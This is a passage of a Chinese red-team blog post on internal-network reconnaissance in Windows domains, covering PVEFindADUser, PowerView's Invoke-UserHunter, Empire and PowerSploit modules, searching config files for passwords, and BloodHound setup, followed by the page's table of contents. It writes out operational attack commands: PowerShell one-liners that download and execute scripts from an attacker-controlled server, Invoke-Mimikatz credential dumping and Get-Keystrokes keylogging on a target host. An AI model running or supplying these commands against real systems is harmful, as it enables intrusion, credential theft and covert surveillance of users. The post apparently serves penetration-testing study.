<p class='item-img' data-src='image-20230909171603538.png'><img src="image-20230909171603538.png" alt="image-20230909171603538"></p>
<h4 id="PVEFindADUser-exe"><a href="#PVEFindADUser-exe" class="headerlink" title="PVEFindADUser-exe"></a>PVEFindADUser.exe</h4>
<p>下载地址：<a target="_blank" rel="noopener" href="https://www.corelan.be/index.php/my-free-tools/ad-cs/pve-find-ad-user/">https://www.corelan.be/index.php/my-free-tools/ad-cs/pve-find-ad-user/</a></p>
<p>PVEFindADUser.exe 可用于查找活动目录用户登陆的位置、枚举域用户，以及查找在特定计算机上登陆的用户，包括查找本地用户。通过RDP远程桌面登陆的用户、通过运行服务和计划任务的用户。运行该工具需要计算机配置**.NET Framework 2.0 环境**，并需要有<strong>管理员权限</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">PVEFindADUser.exe &lt;参数&gt;<br></code></pre></td></tr></table></figure>
<p>我们一般直接运行<code>PVEFindADUser.exe -current</code>命令，即可显示域中所有计算机上当前登陆的所有用户。</p>
<p class='item-img' data-src='image-20230909175333010-1694253213828-1.png'><img src="image-20230909175333010-1694253213828-1.png" alt="image-20230909175333010"></p>
<p>显示指定用户登录的计算机</p>
<table>
<thead>
<tr>
<th>current[“username”]</th>
<th>如果仅指定了-current参数，将获取目标计算机上当前登录的所有用户。如果指定了用户名(Domain\Username)，则显示该用户登陆的计算机</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">PVEFindADUser.exe -current redteam.org\dc<br>//PVEFindADUser.exe -current domain\username<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230909175515361.png'><img src="image-20230909175515361.png" alt="image-20230909175515361"></p>
<h4 id="powerview-ps1"><a href="#powerview-ps1" class="headerlink" title="powerview-ps1"></a>powerview.ps1</h4>
<p>powerview脚本可以用来获取当前域管理员在线登录的服务器，其依赖powershell和wmi，在powersploit工具包中，是一个收集域信息很好用的脚本。</p>
<ul>
<li>Invoke-UserHunter：**搜索本地域中域管理员当前在线的主机，并验证当前用户是否具有对这些主机的本地管理员访问权限。**它可以使用 Get-NetSessions 和Get-NetLoggedon 扫描每台服务器并对扫描结果进行比较，从而找出目标用户集，并且无需管理员权限。</li>
</ul>
<p>如下，可以看到本地域有一个域管理员：</p>
<p><code>net group &quot;domain controllers&quot; /domain</code></p>
<p class='item-img' data-src='image-20230909180145971.png'><img src="image-20230909180145971.png" alt="image-20230909180145971"></p>
<p>我们通过Invoke-UserHunter（等于Invoke-UserHunter -CheckAccess)来定位他们：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">powershell.exe -exec bypass IEX(New-Object Net.WebClient).DownloadString(&#x27;http://39.xxx.xxx.210/powersploit/Recon/PowerView.ps1&#x27;);Invoke-UserHunter<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230909181558855.png'><img src="image-20230909181558855.png" alt="image-20230909181558855"></p>
<p>详情请执行<code>Get-Help Invoke-UserHunter</code>命令查看，具体使用方法与前两个相似，它可以找到域内特定的用户群，接受用户名、用户列表和域组列表查询，接受一个主机列表或查询可用的主机域名。一切都是灵活的，让你自己定义找寻谁，在哪里找。</p>
<p>获取指定用户在线机器：</p>
<p class='item-img' data-src='image-20230909185333858.png'><img src="image-20230909185333858.png" alt="image-20230909185333858"></p>
<h3 id="3-38-Empire信息收集"><a href="#3-38-Empire信息收集" class="headerlink" title="3-38-Empire信息收集"></a>3.38 Empire信息收集</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># 查看本机用户、域组成员、密码设置时间、剪贴板内容、系统基本信息、网络适配器信息、共享信息等<br>usemodule situation_awareness/host/winenum<br># 目标主机事件日志、应用程序控制策略日志、RDP登录信息、PowerShell脚本运行和保存的信息等，需要管理员权限<br>usemodule situational_awareness/host/computerdetails<br></code></pre></td></tr></table></figure>
<h3 id="3-39-powersploit-信息收集"><a href="#3-39-powersploit-信息收集" class="headerlink" title="3-39-powersploit-信息收集"></a>3.39 powersploit 信息收集</h3>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a><br>
，已经停止维护</p>
<p>建立会话后的meterpreter：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#加载模块</span><br>load powershell<br><span class="hljs-comment">#调用本地ps脚本</span><br>powershell_import /usr/share/windows<span class="hljs-literal">-resources</span>/powersploit/Recon/xx.ps1<br><span class="hljs-comment">#命令执行</span><br>powershell_execute  <span class="hljs-built_in">Get-NetDomain</span> <br><span class="hljs-comment">#获取当前的域名称</span><br><span class="hljs-built_in">Get-NetDomain</span>  <br><span class="hljs-comment">#返回所有域内成员的详细信息</span><br><span class="hljs-built_in">Get-Netuser</span> <br><span class="hljs-comment">#获取所有的域内的控制器信息</span><br><span class="hljs-built_in">Get-NetDomainController</span> <br><span class="hljs-comment">#获取所有域内机器的名称</span><br><span class="hljs-built_in">Get-NetComputer</span>  <br><span class="hljs-comment">#获取域内的所有的网络共享</span><br><span class="hljs-built_in">Get-Netshare</span><br><span class="hljs-comment">#获取指定服务的远程连接信息  </span><br><span class="hljs-built_in">Get-NetRDPSESSION</span>  <br><span class="hljs-comment">#获取进程的详细信息</span><br><span class="hljs-built_in">Get-NetProcess</span>  <br><span class="hljs-comment"># 获取活动目录的信息</span><br><span class="hljs-built_in">Get-ADOPJECT</span> <br><span class="hljs-comment">#判断用户是否登陆计算机且用户是否有管理员权限</span><br><span class="hljs-built_in">invoke-processhunter</span><br></code></pre></td></tr></table></figure>
<p>powersploit无文件攻击<br>
将下载的文件放在vps上面。确保目标服务器可以访问：</p>
<p>如：<a target="_blank" rel="noopener" href="http://xxx.com/PowerSplot/Recon/Invoke-Portscan.ps1">http://xxx.com/PowerSplot/Recon/Invoke-Portscan.ps1</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#在目标机导入脚本：<br>iex(new-object net.webclient).downloadstring(&quot;http://192.168.1.4/PowerSploit/Recon/Invoke-Portscan.ps1&quot;)<br>#扫描网段、端口<br>invoke-portscan -hosts 192.168.1.1/24 -ports &quot;21,22,80,139,80,445&quot;<br>#invoke-mimikatz抓取hash<br>iex(new-object net.webclient).downloadstring(&quot;http://192.168.1.4/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1&quot;)<br>#导hash<br>Invoke-Mimikatz -dumpcreds<br>#get-keystrokes键盘记录<br>iex(new-object net.webclient).downloadstring(&quot;http://192.168.1.4/PowerSploit/Exfiltration/Get-Keystrokes.ps1&quot;)<br>#将键盘记录保存到123.txt里面<br>Get-Keystrokes -logpath C:\Users\admin\123.txt<br></code></pre></td></tr></table></figure>
<h3 id="3-40-翻翻配置文件"><a href="#3-40-翻翻配置文件" class="headerlink" title="3-40-翻翻配置文件"></a>3.40 翻翻配置文件</h3>
<p>一个正常的Web应用肯定有对应的数据库账号密码信息，可以使用如下命令寻找包含密码字段的文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">findstr  /s /m &quot;password&quot; *.*<br>findstr /s /i /m /r &quot;defineclass remoteserver&quot; Web目录 \*.jsp<br># /r 表示正则，/s表示遍历子目录，/m表示不显示匹配<br></code></pre></td></tr></table></figure>
<p>Linux查文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">find Web应用目录 -iname &quot;*.jsp*&quot; | xargs egrep -l -i &quot;classloader&quot; |xargs egrep -l -i &quot;cipher&quot;<br>find Web应用目录 -iname &quot;*.php*&quot; | xargs egrep -l -i &quot;openssl_decrypt&quot; |xargs egrep -l -i &quot;file_get_contents&quot;<br></code></pre></td></tr></table></figure>
<p>敏感路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">%WINDIR%<br>%WINDIR%\system32\<br>%TEMP%<br>%LOCALAPPDATA%<br>%APPDATA%<br>C:\TEMP\<br>C:\Windows\Temp<br>%UserProfile%\Downloads<br>%UserProfile%\Recent<br>C:\$Recycle.bin<br></code></pre></td></tr></table></figure>
<p>常用应用的默认配置路径：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Tomcat:<br>CATALINA_HOME/conf/tomcat-users.xml<br><br>Apache:<br>/etc/httpd/conf/httpd.conf<br><br>Nginx:<br>/etc/nginx/nginx.conf<br><br>Wdcp:<br>/www/wdlinux/wdcp/conf/mrpw.conf<br><br>Mysql:<br>mysql\data\mysql\user.MYD<br></code></pre></td></tr></table></figure>
<p>还有一些<strong>Navicat,TeamViewer,FileZilla,WinSCP,Xmangager</strong>系列产品（Xshell,Xftp)的密码查看</p>
<p>项目: <a target="_blank" rel="noopener" href="https://github.com/uknowsec/SharpDecryptPwd">https://github.com/uknowsec/SharpDecryptPwd</a></p>
<h3 id="3-41-BloodHound域分析工具"><a href="#3-41-BloodHound域分析工具" class="headerlink" title="3-41-BloodHound域分析工具"></a>3.41 BloodHound域分析工具</h3>
<p>BloodHound通过图与线的形式，将域内用户、计算机、及相关用户等等之间的关系直观地展现在Red Team队员面前，帮助更快的梳理域内的情况。(这里先做了解)</p>
<ul>
<li>BloodHound基于Neo4j(非关系型数据库)</li>
</ul>
<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4>
<ol>
<li>
<p>安装java</p>
</li>
<li>
<p>安装Neo4jServer Community</p>
<p><a target="_blank" rel="noopener" href="https://neo4j.com/download-center/#community">https://neo4j.com/download-center/#community</a></p>
</li>
</ol>
<p class='item-img' data-src='image-20230909190630424.png'><img src="image-20230909190630424.png" alt="image-20230909190630424"></p>
<p>开启服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">neo4j.bat console<br></code></pre></td></tr></table></figure>
<p>这里发现有点问题，就先放弃了。留个标记等日后需要拾起-  . -</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/jiufang/p/16451978.html">域分析工具BloodHound使用教程 </a></p>
<h3 id="3-42-使用empire收集信息"><a href="#3-42-使用empire收集信息" class="headerlink" title="3-42-使用empire收集信息"></a>3.42 使用empire收集信息</h3>
<p>在攻击机上安装empire后，使用<code>usemodule powershell/situational_awareness/host/winenum</code>即可收集相关信息，注意使用该模块需要拿到管理员权限</p>
<h2 id="四、参考文章："><a href="#四、参考文章：" class="headerlink" title="四、参考文章："></a>四、参考文章：</h2>
<p><a target="_blank" rel="noopener" href="https://hackerqwq.github.io/2021/04/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%AF%87/#%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">内网渗透-信息收集篇</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7663#toc-5">内网渗透初识—信息收集1</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7663#toc-5">内网渗透初识—信息收集2</a></p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/09/03/babyweb/">← 下一篇 攻防世界-babyweb</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/09/02/BadProgrammer/">攻防世界-BadProgrammer 上一篇 →</a></div></div></div><div id="comments"><div id="waline"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">hybcx</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%9C%BA%E5%99%A8%E8%A7%92%E8%89%B2%E5%88%A4%E6%96%AD"><span class="toc-number">1.</span> <span class="toc-text">0x01 机器角色判断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">0x02 本机信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E6%9F%A5%E7%9C%8B%E4%B8%BB%E6%9C%BA%E5%90%8D"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 查看主机名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-%E6%9F%A5%E7%9C%8B%E7%89%88%E6%9C%AC"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 查看版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-%E6%9F%A5%E7%9C%8B%E6%89%80%E6%9C%89%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">2.3.</span> <span class="toc-text">2.3 查看所有环境变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-%E6%9F%A5%E7%9C%8B%E5%AE%89%E8%A3%85%E9%A9%B1%E5%8A%A8"><span class="toc-number">2.4.</span> <span class="toc-text">2.4 查看安装驱动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-5-%E6%9F%A5%E7%9C%8B%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">2.5.</span> <span class="toc-text">2.5 查看操作系统信息</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-5-1-%E6%9E%B6%E6%9E%84"><span class="toc-number">2.5.1.</span> <span class="toc-text">2.5.1 架构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-5-2-%E7%B3%BB%E7%BB%9F%E5%90%8D"><span class="toc-number">2.5.2.</span> <span class="toc-text">2.5.2 系统名</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-6-%E6%9F%A5%E7%9C%8B%E9%80%BB%E8%BE%91%E7%9B%98"><span class="toc-number">2.6.</span> <span class="toc-text">2.6 查看逻辑盘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-7-%E6%9C%AC%E6%9C%BA%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE"><span class="toc-number">2.7.</span> <span class="toc-text">2.7 本机网络配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-8-%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC"><span class="toc-number">2.8.</span> <span class="toc-text">2.8 查看当前系统版本</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#tip%EF%BC%9Awmic%E5%91%BD%E4%BB%A4"><span class="toc-number">2.8.1.</span> <span class="toc-text">tip：wmic命令</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-9-%E6%9F%A5%E7%9C%8B%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84"><span class="toc-number">2.9.</span> <span class="toc-text">2.9 查看体系结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-10-%E6%9F%A5%E8%AF%A2%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8F%8A%E8%BD%AF%E4%BB%B6%E4%BF%A1%E6%81%AF"><span class="toc-number">2.10.</span> <span class="toc-text">2.10 查询操作系统及软件信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-11-%E6%9F%A5%E7%9C%8B-net-framework%E7%89%88%E6%9C%AC"><span class="toc-number">2.11.</span> <span class="toc-text">2.11 查看.net framework版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-12-%E6%9F%A5%E7%9C%8B%E8%A1%A5%E4%B8%81%E5%88%97%E8%A1%A8"><span class="toc-number">2.12.</span> <span class="toc-text">2.12 查看补丁列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-13-%E6%9F%A5%E7%9C%8B%E8%A1%A5%E4%B8%81%E7%9A%84%E5%90%8D%E7%A7%B0%E3%80%81%E6%8F%8F%E8%BF%B0%E3%80%81ID%E3%80%81%E5%AE%89%E8%A3%85%E6%97%B6%E9%97%B4%E7%AD%89"><span class="toc-number">2.13.</span> <span class="toc-text">2.13 查看补丁的名称、描述、ID、安装时间等</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-14-PowerShell%E6%94%B6%E9%9B%86%E8%BD%AF%E4%BB%B6%E7%9A%84%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">2.14.</span> <span class="toc-text">2.14 PowerShell收集软件的版本信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-15-%E6%9F%A5%E7%9C%8B%E5%AE%89%E8%A3%85%E7%9A%84%E8%BD%AF%E4%BB%B6%E7%9A%84%E7%89%88%E6%9C%AC%E3%80%81%E8%B7%AF%E5%BE%84%E7%AD%89"><span class="toc-number">2.15.</span> <span class="toc-text">2.15 查看安装的软件的版本、路径等</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-16-%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90"><span class="toc-number">2.16.</span> <span class="toc-text">2.16 查看当前用户权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-17-%E6%9F%A5%E8%AF%A2%E6%9C%AC%E6%9C%BA%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF"><span class="toc-number">2.17.</span> <span class="toc-text">2.17 查询本机服务信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-18-%E6%9F%A5%E7%9C%8B%E5%BC%80%E5%90%AF%E7%9A%84%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.18.</span> <span class="toc-text">2.18 查看开启的服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-19-wmic%E6%9F%A5%E8%AF%A2%E8%BF%9B%E7%A8%8B%E4%BF%A1%E6%81%AF"><span class="toc-number">2.19.</span> <span class="toc-text">2.19 wmic查询进程信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-20-%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B"><span class="toc-number">2.20.</span> <span class="toc-text">2.20 查看进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-21-%E6%9F%A5%E7%9C%8B%E5%90%AF%E5%8A%A8%E7%A8%8B%E5%BA%8F%E4%BF%A1%E6%81%AF"><span class="toc-number">2.21.</span> <span class="toc-text">2.21 查看启动程序信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-22-%E6%9F%A5%E7%9C%8B%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1-%E9%9C%80%E8%A6%81%E9%AB%98%E6%9D%83%E9%99%90"><span class="toc-number">2.22.</span> <span class="toc-text">2.22 查看计划任务(需要高权限)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-23-%E6%9F%A5%E7%9C%8B%E4%B8%BB%E6%9C%BA%E5%BC%80%E6%9C%BA%E6%97%B6%E9%97%B4"><span class="toc-number">2.23.</span> <span class="toc-text">2.23 查看主机开机时间</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-24-%E6%9F%A5%E7%9C%8B%E6%9C%AC%E6%9C%BA%E7%94%A8%E6%88%B7%E5%88%97%E8%A1%A8"><span class="toc-number">2.24.</span> <span class="toc-text">2.24 查看本机用户列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-25-%E8%8E%B7%E5%8F%96%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E4%BF%A1%E6%81%AF"><span class="toc-number">2.25.</span> <span class="toc-text">2.25 获取本地管理员信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-26-%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7"><span class="toc-number">2.26.</span> <span class="toc-text">2.26 查看当前在线用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-27-%E6%9F%A5%E7%9C%8B%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7"><span class="toc-number">2.27.</span> <span class="toc-text">2.27 查看在线用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-28-%E5%88%97%E5%87%BA%E6%96%AD%E5%BC%80%E6%9C%AC%E5%9C%B0%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%8E%E6%89%80%E8%BF%9E%E6%8E%A5%E7%9A%84%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E5%AF%B9%E8%AF%9D-%E9%9C%80%E8%A6%81%E9%AB%98%E6%9D%83%E9%99%90"><span class="toc-number">2.28.</span> <span class="toc-text">2.28 列出断开本地计算机与所连接的客户端的对话(需要高权限)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-29-%E6%9F%A5%E8%AF%A2%E7%AB%AF%E5%8F%A3%E5%88%97%E8%A1%A8"><span class="toc-number">2.29.</span> <span class="toc-text">2.29 查询端口列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-30-%E6%9F%A5%E7%9C%8B%E6%9C%AC%E6%9C%BA%E5%85%B1%E4%BA%AB%E5%88%97%E8%A1%A8%E5%92%8C%E5%8F%AF%E8%AE%BF%E9%97%AE%E7%9A%84%E5%9F%9F%E5%85%B1%E4%BA%AB%E5%88%97%E8%A1%A8"><span class="toc-number">2.30.</span> <span class="toc-text">2.30 查看本机共享列表和可访问的域共享列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-31-%E6%9F%A5%E6%89%BE%E5%85%B1%E4%BA%AB%E5%88%97%E8%A1%A8"><span class="toc-number">2.31.</span> <span class="toc-text">2.31 查找共享列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-32-%E7%A3%81%E7%9B%98%E6%98%A0%E5%B0%84"><span class="toc-number">2.32.</span> <span class="toc-text">2.32 磁盘映射</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-33-%E6%9F%A5%E8%AF%A2%E8%B7%AF%E7%94%B1%E8%A1%A8"><span class="toc-number">2.33.</span> <span class="toc-text">2.33 查询路由表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-34-%E6%9F%A5%E7%9C%8B%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E4%BF%A1%E6%81%AF"><span class="toc-number">2.34.</span> <span class="toc-text">2.34 查看远程连接信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-35-%E6%9F%A5%E7%9C%8B%E6%9D%80%E8%BD%AF"><span class="toc-number">2.35.</span> <span class="toc-text">2.35 查看杀软</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-36-%E6%9F%A5%E7%9C%8B%E6%9C%AC%E5%9C%B0%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5"><span class="toc-number">2.36.</span> <span class="toc-text">2.36 查看本地密码策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-37-%E6%9F%A5%E7%9C%8Bhosts%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-number">2.37.</span> <span class="toc-text">2.37 查看hosts文件：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-38-%E6%9F%A5%E7%9C%8Bdns%E7%BC%93%E5%AD%98"><span class="toc-number">2.38.</span> <span class="toc-text">2.38 查看dns缓存</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-39-%E5%B8%B8%E8%A7%81%E6%9F%A5%E6%AF%92%E8%BD%AF%E4%BB%B6%E8%BF%9B%E7%A8%8B"><span class="toc-number">2.39.</span> <span class="toc-text">2.39 常见查毒软件进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-40-%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.40.</span> <span class="toc-text">2.40 浏览器信息收集</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">0x03 域环境信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E5%9F%9F"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 判断是否存在域</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E8%A7%A3%E6%9E%90%E5%9F%9F%E5%90%8Dip"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 解析域名ip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E6%9D%83%E9%99%90"><span class="toc-number">3.3.</span> <span class="toc-text">3.3 查看当前权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-%E8%8E%B7%E5%8F%96%E5%9F%9FSID"><span class="toc-number">3.4.</span> <span class="toc-text">3.4 获取域SID</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-5-%E6%9F%A5%E8%AF%A2%E6%8C%87%E5%AE%9A%E7%94%A8%E6%88%B7%E7%9A%84%E8%AF%A6%E6%83%85%E4%BF%A1%E6%81%AF"><span class="toc-number">3.5.</span> <span class="toc-text">3.5 查询指定用户的详情信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-6-%E6%9F%A5%E7%9C%8B%E5%9F%9F%E5%86%85%E6%89%80%E6%9C%89%E8%B4%A6%E5%8F%B7"><span class="toc-number">3.6.</span> <span class="toc-text">3.6 查看域内所有账号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-7-%E5%AF%B9%E6%AF%94%E6%9F%A5%E7%9C%8B%E2%80%9D%E5%9F%9F-%E5%9F%9F%E5%90%8D-%E2%80%9D%E5%92%8C%E2%80%9D%E7%99%BB%E5%BD%95%E6%9C%8D%E5%8A%A1%E5%99%A8-%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8-%E2%80%9D%E7%9A%84%E4%BF%A1%E6%81%AF%E6%98%AF%E5%90%A6%E5%8C%B9%E9%85%8D"><span class="toc-number">3.7.</span> <span class="toc-text">3.7 对比查看”域(域名)”和”登录服务器(域控制器)”的信息是否匹配</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 